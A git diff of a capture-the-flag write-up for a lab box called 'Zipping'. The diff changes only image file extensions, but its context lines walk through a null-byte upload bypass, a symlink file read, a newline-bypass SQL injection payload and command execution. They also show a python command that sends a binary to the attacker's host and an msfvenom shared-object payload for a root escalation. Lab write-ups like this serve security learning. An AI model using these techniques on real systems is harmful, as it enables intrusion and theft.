@@ -37,11 +37,11 @@ Ignoring template assets
 
 Opening up the website in firefox we’re greeted with a watch store page.
 
-![Watch Store](Assets/Zipping_Watch_store.jpg)
+![Watch Store](Assets/Zipping_Watch_store.webp)
 
 The product and cart pages have some interesting parameters in the URL. Let’s run sqlmap with the crawl option and test for IDOR vulnerability with ffuf on the id parameter (nothing interesting is found).
 
-![interesting Url](Assets/interesting_url.jpg)
+![interesting Url](Assets/interesting_url.webp)
 
 ```BASH
 http://10.10.11.229/shop/index.php?page=cart
@@ -54,7 +54,7 @@ $ sqlmap -u http://$TARGET --crawl 3 --batch
 
 The upload page states that it allows us to upload zip files containing a single PDF file. Enumerating the upload filtering a bit; we see that any file can be uploaded, but only zips are processed. There’s no content type header filtering. If there’s more than one file in the zip an error is thrown. The PDF file filtering is only based on the file extension.
 
-![Upload page](Assets/Zipping_Watch_upload.jpg)
+![Upload page](Assets/Zipping_Watch_upload.webp)
 
 Trying to bypass the file extension filtering with a nullbyte does not work.
 
@@ -93,17 +93,17 @@ $ zip p.zip s.phpA.pdf
 
 Intercept the upload POST request and change ‘A’ in the last occurrence of the filename to a nullbyte using the hex view in burp:
 
-![where to change to a nullbyte in burp](Assets/burp_null_byte.jpg)
+![where to change to a nullbyte in burp](Assets/burp_null_byte.webp)
 
 The zip uploads successfully:
 
-![uploaded successfully](Assets/upload_successfull.jpg)
+![uploaded successfully](Assets/upload_successfull.webp)
 
 the link doesn’t work but removing the PDF extension allows us to run PHP code:
 
-![broken link because of the nullbyte](Assets/broken_nullbyte_link.jpg)
+![broken link because of the nullbyte](Assets/broken_nullbyte_link.webp)
 
-![working link cause of nullbyte](Assets/working_link_cause_nullbyte.jpg)
+![working link cause of nullbyte](Assets/working_link_cause_nullbyte.webp)
 
 It’s also possible to exploit this on the newer version. Going to the provided link even after removing the PDF will now not work as it will fail the file exists check because the extension was dropped:
 
@@ -140,18 +140,18 @@ The file was still created in `$uploadPath` though, and on linux sys_get_temp_di
 
 So what else can we do? The check seems to be only based on the file extension, given an lfi, we could upload a PHP file with the PDF extension or use the nullbyte trick to put a file in `/tmp` and run it, but we haven’t found an lfi yet. Another interesting thing to upload would be a symlink:
 
-![Symlink upload from burpsuite](Assets/symlink_upload.jpg)
+![Symlink upload from burpsuite](Assets/symlink_upload.webp)
 
 ```BASH
 ls -s ../../../../../../../../../../../../../../../etc/passwd e.pdf
 zip e.zip --symlinks e.pdf
 ```
 
-![Firefox not loading pdf](Assets/firefox_not_pdf.jpg)
+![Firefox not loading pdf](Assets/firefox_not_pdf.webp)
 
 Firefox still tries to interpret it as a PDF but viewing the response in burp we see a file!
 
-![burpsuite shows that it was trying to interpret a text file](Assets/burp_shows_file.jpg)
+![burpsuite shows that it was trying to interpret a text file](Assets/burp_shows_file.webp)
 
 Let’s write a quick script to make looking around easier:
 
@@ -191,7 +191,7 @@ include $page . '.php';
 
 `$_GET['page']` is passed into an include statement if the file exists. This should allow for an LFI.
 
-![Shows lfi working](Assets/lfi_page_param.jpg)
+![Shows lfi working](Assets/lfi_page_param.webp)
 
 Seems to work. Problem is without we don’t have a way to upload any files with the .php extension currently. Attempting to bypass the string concat by appending a null byte to the page parameter and by path truncation doesn’t work either. The service is probably using an up-to-date version of PHP.
 
@@ -317,9 +317,9 @@ if (isset($_POST['product_id'], $_POST['quantity'])) {
 
 Similar situation in the cart.php file. A bit of googling suggests preg_match can be bypassed using new lines. After playing around with the regex in [https://regex101.com/](https://regex101.com/) it seems the input has to end in a numeric value but adding a new line at the beginning and after the payload seems to not be detected. Let’s try it in burpsuite.
 
-![Payload in regex101.com](Assets/regex101.jpg)
+![Payload in regex101.com](Assets/regex101.webp)
 
-![Burpsuite showing the raw sql injection payload](Assets/burp_raw_sql_payload.jpg)
+![Burpsuite showing the raw sql injection payload](Assets/burp_raw_sql_payload.webp)
 
 ```
 GET /shop/index.php?page=product&id=%0d%0a%27%20%6f%72%20%31%3d%31%3b%0d%0a%2d%2d%32 HTTP/1.1
@@ -334,11 +334,11 @@ Connection: close
 Upgrade-Insecure-Requests: 1
 ```
 
-![Burpsuite showing the encoded sql injection payload](Assets/burp_encoded_sqli.jpg)
+![Burpsuite showing the encoded sql injection payload](Assets/burp_encoded_sqli.webp)
 
 Seems to work! Let’s export a request with an injection marker for sqlmap.
 
-![Burp showing response](Assets/burp_response.jpg)
+![Burp showing response](Assets/burp_response.webp)
 
 ```
 GET /shop/index.php?page=product&id=%0d%0a%27*%3b%0d%0a%2d%2d%32 HTTP/1.1
@@ -493,7 +493,7 @@ Upgrade-Insecure-Requests: 1
 
 and we get a command execution!
 
-![Burp showing successful command exec](Assets/burp_command_exec.jpg)
+![Burp showing successful command exec](Assets/burp_command_exec.webp)
 
 ```
 GET /shop/index.php?page=/var/lib/mysql/s&cmd=ls HTTP/1.1
@@ -511,7 +511,7 @@ Upgrade-Insecure-Requests: 1
 
 Let’s get a reverse shell! https://www.revshells.com/
 
-![Rev shell generator website](Assets/rev_shell_gen.jpg)
+![Rev shell generator website](Assets/rev_shell_gen.webp)
 
 I’ll base64 encode adding spaces where needed to remove non-alphanumeric characters and gamble on the target having the base64 utility installed to hopefully increase the chance of the payload working.
 
@@ -622,11 +622,11 @@ rektsu@zipping:/var/www/html/shop$ which python3
 $ python3 -c 'import requests;requests.post("http://10.10.14.207:8000/upload",files={"files":open("/usr/bin/stock","rb")})'
 ```
 
-![Ghidra showing decomp of main function](Assets/ghidra_main.jpg)
+![Ghidra showing decomp of main function](Assets/ghidra_main.webp)
 
 After locating the decompilation of the main function we can see that the executable will first prompt the user for a password using fgets which will read 0x1e (or 30 in decimal) bytes from stdin. The buffer into which the input will be written to seems to be 44 bytes, so no buffer overflow here. The passed in value will be then passed into the checkAuth function which will check the input against “St0ckM4nager”. If check auth returns something other than 0 we get to this odd looking section with a bunch of constants that first go through the XOR function and then go into dlopen. Dlopen is a linux standard library function that allows us to dynamically load shared objects which are basically the linux equivalent of windows DLLs. If we can somehow get the binary to load our malicious shared object we will be able to inherit permissions (root) and execute code.
 
-![Ghidra showing decompilation of the checkSec function](Assets/ghidra_check_auth.jpg)
+![Ghidra showing decompilation of the checkSec function](Assets/ghidra_check_auth.webp)
 
 There are a few ways to get the path that is passed in:
 
@@ -634,24 +634,24 @@ There are a few ways to get the path that is passed in:
 
 Let’s take a closer look at the decompilation of the XOR function and try to clean it up a bit.
 
-![xor function passed in constants](Assets/ghidra_xor_constants.jpg)
+![xor function passed in constants](Assets/ghidra_xor_constants.webp)
 
 Since the XOR function is called only once during the program we can treat param_2 and param_4 as simple constants:
 
-![xor function variables renamed to constants](Assets/xor_func_constants.jpg)
+![xor function variables renamed to constants](Assets/xor_func_constants.webp)
 
 Let’s also give the other variables slightly more meaningful names:
 
-![xor func variable names cleanup](Assets/xor_func_renamed.jpg)
+![xor func variable names cleanup](Assets/xor_func_renamed.webp)
 
 Now we can see that the function simply loops a set amount of times and performs an xor on each byte of input. The variable c is reset when it hits zero meaning param_3 will be repeated if need be to match the length of input. One problem remains. If the loop will iterate over 34 bytes of input but a long is only 8 bytes the program will start messing with other things on the stack. Namely, those weird variables right above the function call. Since dlopen expects a null terminated array or char as input could those be a part of a char array? Let’s change the type to char[34] and see if the decompilation makes more sense.
 
-![ghidra array type verbose](Assets/char_array_ghidra.jpg)
+![ghidra array type verbose](Assets/char_array_ghidra.webp)
 
 Definitely more verbose. Converting the param_3 variable into a char[8] array also reveals that the parameter is a string. Things are starting to make more sense now.
 Changing variable types in the XOR function makes it much easier to read.
 
-![cleaned up xor func](Assets/char_ptr_xor_retype.jpg)
+![cleaned up xor func](Assets/char_ptr_xor_retype.webp)
 
 We should be able to now simply copy the cleaned up decompiled code and run it:
 
@@ -765,7 +765,7 @@ Put the stock binary and the downloaded libc files into one directory and run `p
 $ gdb stock_patched
 ```
 
-![gdb open with stock_patched loaded](Assets/gdb_stock_patched.jpg)
+![gdb open with stock_patched loaded](Assets/gdb_stock_patched.webp)
 
 If your gdb doesn’t look as fancy as mine install [GEF](https://github.com/hugsy/gef). Let’s break on the dlopen call:
 
@@ -775,17 +775,17 @@ b dlopen
 
 then run and provide the password:
 
-![gdb running stock binary](Assets/gdb_run_stock.jpg)
+![gdb running stock binary](Assets/gdb_run_stock.webp)
 
 And we can instantly see that path we were looking for pointed at by $rdi and $rax (in linux x64 the convention is to pass the first argument in $rdi)
 
-![gdb open at breakpoint](Assets/gdb_breakpoint_dlopen.jpg)
+![gdb open at breakpoint](Assets/gdb_breakpoint_dlopen.webp)
 
 ## Strace
 
 Running strace to log all the syscalls the binary is making also works:
 
-![output of running strace on stock](Assets/strace_on_stock.jpg)
+![output of running strace on stock](Assets/strace_on_stock.webp)
 
 Now all that is left is to write a malicious shared object, put in at that path and run the program as sudo to get code exec as root! Again we have a few options here:
 
@@ -803,7 +803,7 @@ Final size of elf-so file: 423 bytes
 Saved as: libcounter.so
 ```
 
-![msfvenom payload in ghidra](Assets/msfvenom_decompilation.jpg)
+![msfvenom payload in ghidra](Assets/msfvenom_decompilation.webp)
 
 The above in my case will call the sys_execve syscall and run ”/bin/sh” though no guarantee is given that this will always be the case. We can change the CMD option to have some other command ran.
 
@@ -817,7 +817,7 @@ Final size of elf-so file: 441 bytes
 Saved as: libcounter.so
 ```
 
-![msfvenom payload with custom command in ghidra](Assets/msfvenom_decompilation_custom_command.jpg)
+![msfvenom payload with custom command in ghidra](Assets/msfvenom_decompilation_custom_command.webp)
 
 This will effectively run `/bin/sh -c 'id'`.
 
@@ -841,7 +841,7 @@ $ sudo /usr/bin/stock
 
 Pass in the password and we’re root!
 
-![compiled on target steps](Assets/compile_on_target.jpg)
+![compiled on target steps](Assets/compile_on_target.webp)
 
 ### Assembly to the rescue
 
